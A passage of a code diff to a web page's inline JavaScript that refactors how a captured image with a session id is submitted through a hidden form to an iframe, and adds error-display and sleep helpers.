-
-        const payload = {
-
-
-          id:
-            sessionId,
-
-
-          captureNumber:
-            number,
-
-
-          image:
-            image
 
         };
 
 
-        // ---------------------------------------------------
-        // INPUT
-        // ---------------------------------------------------
+      /**
+       * --------------------------------------------
+       * SUBMIT
+       * --------------------------------------------
+       */
 
-        const input =
-          document.createElement(
-            "input"
-          );
+      form.submit();
 
 
-        input.type =
-          "hidden";
+      /**
+       * --------------------------------------------
+       * CLEANUP
+       * --------------------------------------------
+       */
 
+      function cleanup() {
 
-        input.name =
-          "payload";
+        try {
 
+          form.remove();
 
-        input.value =
-          JSON.stringify(
-            payload
-          );
-
-
-        form.appendChild(
-          input
-        );
-
-
-        document.body.appendChild(
-          form
-        );
-
-
-        // ---------------------------------------------------
-        // RESPONSE
-        // ---------------------------------------------------
-
-        let finished =
-          false;
-
-
-        iframe.onload =
-          function() {
-
-
-            if (finished)
-              return;
-
-
-            finished =
-              true;
-
-
-            setTimeout(
-
-              function() {
-
-
-                cleanup();
-
-
-                resolve(
-                  true
-                );
-
-
-              },
-
-              1000
-
-            );
-
-          };
-
-
-        // ---------------------------------------------------
-        // TIMEOUT
-        // ---------------------------------------------------
-
-        const timeout =
-
-          setTimeout(
-
-            function() {
-
-
-              if (finished)
-                return;
-
-
-              finished =
-                true;
-
-
-              cleanup();
-
-
-              resolve(
-                false
-              );
-
-
-            },
-
-            60000
-
-          );
-
-
-        // ---------------------------------------------------
-        // SUBMIT
-        // ---------------------------------------------------
-
-        form.submit();
-
-
-        // ---------------------------------------------------
-        // CLEANUP
-        // ---------------------------------------------------
-
-        function cleanup() {
-
-
-          clearTimeout(
-            timeout
-          );
-
-
-          try {
-
-            document.body.removeChild(
-              form
-            );
-
-          }
-
-          catch (e) {}
-
-
-          try {
-
-            document.body.removeChild(
-              iframe
-            );
-
-          }
-
-          catch (e) {}
+          iframe.remove();
 
         }
 
+        catch (e) {}
+
       }
 
-    );
+    }
+  );
 
-  }
-
-
-
-  // =========================================================
-  // DELAY
-  // =========================================================
-
-  function delay(ms) {
+}
 
 
-    return new Promise(
+/**
+ * ==================================================
+ * SHOW ERROR
+ * ==================================================
+ */
 
-      resolve =>
+function showError(
+  message
+) {
 
-        setTimeout(
-          resolve,
-          ms
-        )
+  mainButton.style.display =
+    'none';
 
-    );
 
-  }
+  errorBox.style.display =
+    'block';
+
+
+  errorMessage.innerText =
+    message;
+
+}
+
+
+/**
+ * ==================================================
+ * SLEEP
+ * ==================================================
+ */
+
+function sleep(
+  milliseconds
+) {
+
+  return new Promise(
+    resolve =>
+      setTimeout(
+        resolve,
+        milliseconds
+      )
+  );
+
+}
 
 
 </script>
-
 
 </body>
 
